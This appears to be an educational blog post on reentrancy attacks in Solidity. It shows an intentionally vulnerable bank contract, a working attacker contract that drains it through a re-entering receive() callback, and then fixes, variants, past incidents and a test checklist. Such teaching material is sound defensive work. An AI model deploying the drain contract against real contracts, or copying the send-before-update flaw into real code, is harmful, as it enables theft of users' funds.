---
title: Reentrancy Attack Explained: Solidity Example and Prevention
description: A reentrancy attack lets a contract call back into your function before it finishes. See a vulnerable contract, the exploit, and three fixes.
tags: Security, Reentrancy, Solidity
keywords: reentrancy attack, reentrancy attack explained, reentrancy solidity example, how to prevent reentrancy, checks effects interactions, the dao hack
cover: hero repeat bug shield-alert lock coins
---

A **reentrancy attack** happens when a smart contract sends ETH to, or calls, another contract **before** updating its own records. The receiving contract uses that moment to call back into the first contract, which still shows the old balance, and withdraws again. It repeats this until the funds are gone. The fix is to update state before making external calls (the **checks-effects-interactions** pattern) and to add a **reentrancy guard**.

## A simple picture

A bank teller gives you cash first and writes it in the ledger afterwards. While the teller is still counting your notes, you ask again: "What is my balance?" The ledger still shows the full amount, so the teller pays you again. And again.

A contract that sends money before updating the balance makes the same mistake.

## The vulnerable contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Nothing to withdraw");

        // 1. INTERACTION: send ETH first
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "Transfer failed");

        // 2. EFFECT: update the balance too late
        balances[msg.sender] = 0;
    }
}
```

It looks fine. The problem is the order: the balance is set to zero **after** the ETH is sent.

## Why sending ETH runs other code

When a contract receives ETH through `.call`, its `receive()` or `fallback()` function runs automatically. The receiver can put any code there, including a call back to the sender.

## The attack contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IBank public bank;
    address public owner;

    constructor(IBank _bank) {
        bank = _bank;
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value == 1 ether, "Send 1 ETH");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // Runs every time the bank sends ETH to this contract
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();        // re-enter before the balance is zeroed
        }
    }

    function collect() external {
        payable(owner).transfer(address(this).balance);
    }
}
```

## The attack step by step

Assume the bank holds 10 ETH from other users.

1. The attacker deposits 1 ETH. The bank records `balances[attacker] = 1`.
2. The attacker calls `withdraw()`.
3. The bank checks: balance is 1 ETH. It sends 1 ETH.
4. That transfer triggers the attacker's `receive()`.
5. `receive()` calls `withdraw()` **again**.
6. The bank checks: `balances[attacker]` is **still 1**, because the line that sets it to zero has not run. It sends 1 more ETH.
7. Steps 4 to 6 repeat until the bank is empty.
8. The calls return one by one. Each sets the balance to 0, which changes nothing now.

```text
withdraw()
  └─ send 1 ETH -> receive()
        └─ withdraw()
              └─ send 1 ETH -> receive()
                    └─ withdraw()
                          └─ ... until the bank is empty
```

With 1 ETH, the attacker takes all 11.

## Fix 1: checks-effects-interactions

Write every function in this order:

1. **Checks:** validate inputs and conditions.
2. **Effects:** update your own state.
3. **Interactions:** call other contracts or send ETH.

```solidity
function withdraw() external {
    // 1. Checks
    uint256 amount = balances[msg.sender];
    require(amount > 0, "Nothing to withdraw");

    // 2. Effects
    balances[msg.sender] = 0;

    // 3. Interactions
    (bool ok, ) = msg.sender.call{value: amount}("");
    require(ok, "Transfer failed");
}
```

If the attacker re-enters now, the balance is already 0 and the `require` fails. If the transfer fails, the whole transaction reverts and the balance is restored.

This pattern is the primary defense. Use it everywhere, whether or not you see a risk.

## Fix 2: a reentrancy guard

A guard is a lock. It blocks a function from being entered again while it is still running.

```solidity
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract SafeBank is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external nonReentrant {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Nothing to withdraw");

        balances[msg.sender] = 0;

        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "Transfer failed");
    }
}
```

How the modifier works in principle:

```solidity
bool private locked;

modifier nonReentrant() {
    require(!locked, "Reentrant call");
    locked = true;
    _;
    locked = false;
}
```

Use the guard **together with** checks-effects-interactions, not in place of it. Recent versions of Solidity and OpenZeppelin can keep the lock in **transient storage**, which makes the guard much cheaper in gas.

## Fix 3: pull payments

Do not push money to users inside complex logic. Record what each user is owed, and let them collect it with a separate, simple function. A failing or hostile receiver then affects only itself.

## Why `transfer` and `send` are not the answer

For years, developers used `transfer()`, which forwards only 2,300 gas, too little for the receiver to call back. This is no longer recommended:

- Gas costs of operations have changed in network upgrades, and can change again.
- It breaks payments to smart contract wallets and multisigs, which need more than 2,300 gas to receive.

The current advice is to use `.call{value: amount}("")` and protect against reentrancy with the patterns above.

## Other kinds of reentrancy

The classic case is one function re-entering itself. Modern attacks are often less obvious.

### Cross-function reentrancy

The attacker re-enters a **different** function that uses the same state.

```solidity
function withdraw() external {
    uint256 amount = balances[msg.sender];
    (bool ok, ) = msg.sender.call{value: amount}("");   // attacker re-enters transfer()
    require(ok);
    balances[msg.sender] = 0;
}

function transfer(address to, uint256 amount) external {
    require(balances[msg.sender] >= amount);
    balances[msg.sender] -= amount;
    balances[to] += amount;      // moves the "balance" that was already paid out
}
```

A guard on `withdraw` alone does not stop this. Put the guard on **every** function that touches the shared state, and follow checks-effects-interactions.

### Cross-contract reentrancy

Two contracts share state. The attacker re-enters the second one while the first is in the middle of an update.

### Read-only reentrancy

The attacker does not re-enter to change anything. During the callback, another protocol **reads** a `view` function of the victim contract, such as a price or a share value, while its state is temporarily inconsistent. That protocol then acts on a wrong number. Several DeFi incidents in recent years used this method, and a normal guard on write functions does not prevent it.

### Token callbacks

Not only ETH transfers trigger outside code:

- **ERC-777** tokens call hooks on the sender and receiver.
- **ERC-721** `safeTransferFrom` and `_safeMint` call `onERC721Received` on the receiver.
- **ERC-1155** transfers call a receiver hook.

Any of these hands control to another contract. Treat them as external calls.

## Real incidents

- **The DAO, 2016.** An investment fund on Ethereum lost about 3.6 million ETH, then worth about 60 million US dollars, to reentrancy. The response split the network into Ethereum and Ethereum Classic. See [what a DAO is](/blogs/what-is-a-dao).
- **Lendf.Me, 2020.** About 25 million US dollars taken through an ERC-777 token hook.
- **Cream Finance, 2021.** Losses through reentrancy involving a token with callbacks.
- **Curve pools, 2023.** A bug in certain versions of the Vyper compiler broke its reentrancy lock, and several pools were drained.

The last case shows that even a correctly written guard depends on the tools beneath it.

## How to find reentrancy in your code

1. **List every external call**: `.call`, token transfers, calls to other contracts, safe mints.
2. **For each one, ask:** what state has not been updated yet? What could the called contract do if it called back right now?
3. **Run static analysis.** Slither reports reentrancy patterns automatically.
4. **Write an attack test.** Deploy a hostile contract in your test suite and try to drain your own code.

```solidity
// Foundry test (structure)
function test_ReentrancyIsBlocked() public {
    vm.deal(address(bank), 10 ether);
    Attacker attacker = new Attacker(IBank(address(bank)));

    vm.expectRevert();
    attacker.attack{value: 1 ether}();

    assertEq(address(bank).balance, 10 ether);
}
```

5. **Use fuzz and invariant tests** with a rule such as "the contract's ETH balance is always at least the sum of all user balances". See [Hardhat vs Foundry](/blogs/hardhat-vs-foundry).
6. **Get an audit** before holding real funds.

## A prevention checklist

- Update state before every external call.
- Add `nonReentrant` to every function that moves funds or changes shared state.
- Treat token transfers and safe mints as external calls.
- Be careful when another protocol reads your `view` functions for prices.
- Prefer pull payments.
- Test with an attacker contract.

More defensive patterns are in [smart contract security best practices](/blogs/smart-contract-security-and-optimization).

## FAQ

### What is a reentrancy attack in simple words?

A contract pays out before it updates its records. The receiver calls back in during the payment and is paid again, because the records still show the old balance.

### How do you prevent reentrancy in Solidity?

Update state before making external calls, add a `nonReentrant` guard to functions that move funds or change shared state, and prefer letting users withdraw funds themselves.

### Does Solidity 0.8 prevent reentrancy?

No. Version 0.8 added automatic overflow checks. Reentrancy is a logic problem and must be prevented by how you write the contract.

### Is a reentrancy guard enough by itself?

It stops the classic case. It does not stop read-only reentrancy or problems between contracts that do not share the lock. Combine it with correct ordering of state updates.
